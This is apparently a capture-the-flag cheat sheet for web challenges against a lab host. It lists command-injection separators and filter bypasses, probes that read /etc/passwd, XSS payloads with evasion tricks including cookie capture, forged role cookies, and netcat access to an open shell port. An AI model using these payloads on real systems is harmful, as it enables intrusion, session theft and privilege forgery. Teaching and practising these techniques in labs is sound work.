# Command Injection · XSS · Cookie Tokens

## Goal
An input that is pasted into a shell command (command injection), into the page (XSS), or a cookie that only LOOKS protected.

**Fast path (script)**
```bash
ctf --find-input "http://$IP/page"                                        # where does the page take input? prints the next command
ctf --inject "curl -s 'http://$IP/ping?host={P}'" --cmd 'cat flag.txt'    # command box: {P} = where the payload goes
ctf --inject "curl -s 'http://$IP/guestbook?name={P}'"                    # XSS: finds the string, opens Chromium itself, prints the flag
ctf --inject "curl -s 'http://$IP/post?msg={P}'" --see "http://$IP/board" # stored XSS: typed on one page, shown on another
```
Fails → by hand below.

**Checklist**
- [ ] which is it? box "pings / looks up / runs" something → A · page shows your text back → B · logged in as guest / cookie set → C
- [ ] tried in the URL AND in the form (POST)?
- [ ] XSS tested in a real browser (curl does not run scripts)

# A. Command injection (ping box, lookup tool, "network tools")
Server runs `ping <your text>` → end its command, start yours.
```text
127.0.0.1; cat flag.txt        ; = next command           (first choice)
127.0.0.1 | cat flag.txt       | = feed into next
127.0.0.1 && cat flag.txt      && = if the first worked
x || cat flag.txt              || = if the first failed
$(cat flag.txt)   `cat flag.txt`   runs inside the first command
```
From the terminal (curl encodes the spaces and `;` for you):
```bash
curl -s -G "http://$IP/ping" --data-urlencode "host=127.0.0.1; cat flag.txt"       # GET  (?host=…)
curl -s "http://$IP/ping" --data-urlencode "host=127.0.0.1; cat flag.txt"          # POST (form)
```
Flag file unknown → look first: `; id` · `; ls -la` · `; ls /` · `; find / -name '*flag*' 2>/dev/null` · `; cat /etc/passwd`
Filtered:
```text
space removed   → 127.0.0.1;cat${IFS}flag.txt      or   ;cat<flag.txt
; removed       → try | && || $( ) and a new line:  127.0.0.1%0acat flag.txt   (type %0a in the URL itself)
"cat" removed   → tac  head  more  less  nl  or  c'a't flag.txt
"flag" removed  → cat fl*   or   cat fl?g.txt
no output shown → 127.0.0.1; sleep 5   (page takes 5 s = it runs) → write it where you can read: ; cat flag.txt > out.txt → open /out.txt
```

# B. XSS (page prints your text back)
Reflected = in the URL, shown at once. Stored = saved (guestbook, comment), shown to whoever opens the page.
```text
<script>alert(1)</script>              first try
<ScRiPt>alert(1)</ScRiPt>              filter knows only lowercase
<scr<script>ipt>alert(1)</scr</script>ipt>     filter deletes "<script>" once
<img src=x onerror=alert(1)>           "script" blocked entirely
<svg onload=alert(1)>
"><script>alert(1)</script>            your text lands inside value="…" → close the attribute first
" autofocus onfocus=alert(1) x="       < > are escaped but quotes are not
';alert(1);//                          your text lands inside a <script> string
alert(document.cookie)                 Q asks for the cookie → put this instead of alert(1)
```
1. Type the string in the box, or in the URL: `http://$IP/guestbook?name=<script>alert(1)</script>` **in the browser**.
2. Pop-up appears → flag is in the pop-up, on the page after it, or in the cookie (F12 → Storage → Cookies).
3. No pop-up → Ctrl+U, find your text: what was removed or escaped? → pick the row above that fits.
```bash
curl -s -G "http://$IP/guestbook" --data-urlencode "name=<script>alert(1)</script>" | grep -i 'script'     # only CHECKS it comes back unchanged
```

# C. Cookie / token that is only encoded
```bash
curl -si "http://$IP/token" | grep -i set-cookie                     # what does the site hand out?
```
- `eyJ….eyJ….xxx` = JWT → middle part is plain base64: `echo '<middle part>' | base64 -d 2>/dev/null ; echo` (flag / role often inside) → [09_decode](09_decode.md)
- `role=guest` · `admin=0` · `user=dXNlcg==` → change it and resend: `curl -s -b "role=admin" "http://$IP/member"`
- base64 value → decode, edit, encode again: `echo -n 'admin' | base64`

# D. Port that answers like a shell ("backdoor", "left open", maintenance port)
```bash
nc -nv $IP $PORT                         # type: id ; ls -la ; cat flag.txt
ctf --banner $IP:$PORT --send 'id; ls -la; cat flag*'
```

### Helpline
```bash
# zsh: URL with ? & < > → single quotes around the whole URL.
# payload works in the box but not with curl → use --data-urlencode (spaces, ; & + must be encoded).
# XSS: the kit says "not exploitable with the lecture strings" on a command box → normal, it is not an XSS page.
# pop-up shows but no flag → read the page again after closing it, then document.cookie, then the page source.
# command box prints nothing new → try each separator ( ; | && || ), then the blind test (sleep 5).
# not this → input reacts to ' → [05_sqli](05_sqli.md) · input is a file name → [06_lfi](06_lfi.md)
```
